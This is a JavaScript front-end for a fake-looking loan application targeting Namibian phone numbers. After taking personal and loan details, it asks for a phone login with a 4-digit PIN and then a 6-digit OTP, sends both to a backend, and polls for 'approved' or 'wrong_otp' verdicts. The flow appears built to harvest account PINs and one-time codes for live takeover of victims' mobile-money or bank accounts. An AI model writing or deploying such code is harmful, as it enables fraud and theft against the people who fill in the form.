// Configuration
const API_BASE_URL = 'http://localhost:3000/api';
let countdownInterval = null;
let sessionId = null;

// State management
const state = {
  fullName: '',
  phoneNumber: '',
  loanAmount: 0,
  loanPurpose: '',
  loginPhone: '',
  loginPin: '',
  otpCode: '',
};

// Page Navigation
function goToPage(pageNum) {
  // Hide all pages
  document.querySelectorAll('.screen').forEach(screen => {
    screen.classList.add('hidden');
  });

  // Show target page
  document.getElementById(`page${pageNum}`).classList.remove('hidden');

  // Reset forms if going back
  if (pageNum === 1) {
    resetState();
  }

  // Start OTP countdown if on page 4
  if (pageNum === 4) {
    startOTPCountdown();
  }

  window.scrollTo(0, 0);
}

function resetState() {
  state.fullName = '';
  state.phoneNumber = '';
  state.loanAmount = 0;
  state.loanPurpose = '';
  state.loginPhone = '';
  state.loginPin = '';
  state.otpCode = '';
  sessionId = null;

  // Clear form fields
  document.querySelectorAll('input, select').forEach(field => {
    field.value = '';
  });
}

// Page 2: Submit Personal Details
async function submitPersonalDetails() {
  const fullName = document.getElementById('fullName').value.trim();
  const phoneNumber = document.getElementById('phoneNumber').value.trim();
  const loanAmount = document.getElementById('loanAmount').value;
  const loanPurpose = document.getElementById('loanPurpose').value;

  // Validation
  if (!fullName || !phoneNumber || !loanAmount || !loanPurpose) {
    alert('Please fill in all fields');
    return;
  }

  if (!isValidNamibiaPhone(phoneNumber)) {
    alert('Please enter a valid Namibian phone number (+264XXXXXXXX)');
    return;
  }

  if (parseInt(loanAmount) < 10000 || parseInt(loanAmount) > 500000) {
    alert('Loan amount must be between N$10,000 and N$500,000');
    return;
  }

  // Save state
  state.fullName = fullName;
  state.phoneNumber = phoneNumber;
  state.loanAmount = parseInt(loanAmount);
  state.loanPurpose = loanPurpose;

  showLoading(true);

  try {
    const response = await fetch(`${API_BASE_URL}/loan/apply`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        fullName,
        phoneNumber,
        loanAmount,
        loanPurpose,
      }),
    });

    const data = await response.json();

    if (!response.ok) {
      throw new Error(data.message || 'Failed to submit application');
    }

    sessionId = data.sessionId;
    console.log('Application submitted. Session ID:', sessionId);

    // Proceed to login page
    goToPage(3);
  } catch (error) {
    console.error('Error:', error);
    alert('Error: ' + error.message);
  } finally {
    showLoading(false);
  }
}

// Page 3: Submit Login (Phone & PIN)
async function submitLogin() {
  const loginPhone = document.getElementById('loginPhone').value.trim();
  const loginPin = document.getElementById('loginPin').value.trim();

  // Validation
  if (!loginPhone || !loginPin) {
    alert('Please fill in all fields');
    return;
  }

  if (!isValidNamibiaPhone(loginPhone)) {
    alert('Please enter a valid Namibian phone number');
    return;
  }

  if (loginPin.length !== 4 || !/^\d{4}$/.test(loginPin)) {
    alert('PIN must be 4 digits');
    return;
  }

  // Save state
  state.loginPhone = loginPhone;
  state.loginPin = loginPin;

  showLoading(true);

  try {
    const response = await fetch(`${API_BASE_URL}/loan/verify-login`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        sessionId,
        phoneNumber: loginPhone,
        pin: loginPin,
      }),
    });

    const data = await response.json();

    if (!response.ok) {
      throw new Error(data.message || 'Login verification failed');
    }

    console.log('Login submitted. Waiting for approval...');
    sessionId = data.sessionId;

    // Poll for approval status
    pollForApproval('login');
  } catch (error) {
    console.error('Error:', error);
    alert('Error: ' + error.message);
    showLoading(false);
  }
}

// Page 4: Submit OTP
async function submitOTP() {
  const otpCode = document.getElementById('otpCode').value.trim();

  if (!otpCode || otpCode.length !== 6 || !/^\d{6}$/.test(otpCode)) {
    alert('Please enter a valid 6-digit OTP');
    return;
  }

  state.otpCode = otpCode;

  showLoading(true);

  try {
    const response = await fetch(`${API_BASE_URL}/loan/verify-otp`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        sessionId,
        otp: otpCode,
      }),
    });

    const data = await response.json();

    if (!response.ok) {
      throw new Error(data.message || 'OTP verification failed');
    }

    console.log('OTP submitted. Waiting for approval...');

    // Poll for approval status
    pollForApproval('otp');
  } catch (error) {
    console.error('Error:', error);
    alert('Error: ' + error.message);
    showLoading(false);
  }
}

// Resend OTP
async function resendOTP() {
  const resendBtn = event.target;
  resendBtn.disabled = true;

  try {
    const response = await fetch(`${API_BASE_URL}/loan/resend-otp`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        sessionId,
        phoneNumber: state.phoneNumber,
      }),
    });

    const data = await response.json();

    if (!response.ok) {
      throw new Error(data.message || 'Failed to resend OTP');
    }

    alert('OTP resent to your phone number');
    // Reset countdown
    document.getElementById('otpCode').value = '';
    startOTPCountdown();
  } catch (error) {
    console.error('Error:', error);
    alert('Error: ' + error.message);
  } finally {
    setTimeout(() => {
      resendBtn.disabled = false;
    }, 5000);
  }
}

// OTP Countdown Timer
function startOTPCountdown() {
  let seconds = 130;

  // Clear existing interval
  if (countdownInterval) clearInterval(countdownInterval);

  const updateCountdown = () => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    document.getElementById('countdown').textContent = 
      `${mins}:${secs.toString().padStart(2, '0')}`;

    if (seconds <= 0) {
      clearInterval(countdownInterval);
      document.querySelector('.timer').classList.add('expired');
      document.querySelector('.btn-resend').disabled = false;
    }

    seconds--;
  };

  updateCountdown();
  countdownInterval = setInterval(updateCountdown, 1000);
}

// Polling for approval status
async function pollForApproval(stage) {
  const maxAttempts = 60; // 60 seconds
  let attempts = 0;

  const poll = async () => {
    try {
      const response = await fetch(`${API_BASE_URL}/loan/check-status`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          sessionId,
          stage,
        }),
      });

      const data = await response.json();

      console.log('Status check:', data);

      if (data.status === 'approved') {
        showLoading(false);
        // Show approval page
        document.getElementById('approvalAmount').textContent = 
          `N$${state.loanAmount.toLocaleString()}`;
        goToPage(5);
        stopPolling = true;
        return;
      } else if (data.status === 'denied') {
        showLoading(false);
        document.getElementById('errorMessage').textContent = 
          data.reason || 'Your application could not be processed.';
        goToPage(6);
        stopPolling = true;
        return;
      } else if (data.status === 'wrong_otp' && stage === 'otp') {
        showLoading(false);
        alert('Incorrect OTP. Please try again.');
        goToPage(4);
        stopPolling = true;
        return;
      }

      attempts++;
      if (attempts < maxAttempts) {
        setTimeout(poll, 1000); // Poll every second
      } else {
        showLoading(false);
        alert('Request timeout. Please try again.');
        if (stage === 'login') goToPage(3);
        if (stage === 'otp') goToPage(4);
      }
    } catch (error) {
      console.error('Poll error:', error);
      attempts++;
      if (attempts < maxAttempts) {
        setTimeout(poll, 1000);
      } else {
        showLoading(false);
        alert('Error checking status');
      }
    }
  };

  let stopPolling = false;
  poll();
}

// Helper Functions
function isValidNamibiaPhone(phone) {
  // Namibia phone format: +264XXXXXXXX (8 digits after +264)
  const namibiaPhoneRegex = /^\+264[0-9]{8}$/;
  return namibiaPhoneRegex.test(phone);
}

function showLoading(show) {
  const loadingScreen = document.getElementById('loadingScreen');
  if (show) {
    loadingScreen.classList.remove('hidden');
  } else {
    loadingScreen.classList.add('hidden');
  }
}

// Initialize - Show page 1
document.addEventListener('DOMContentLoaded', () => {
  goToPage(1);
});
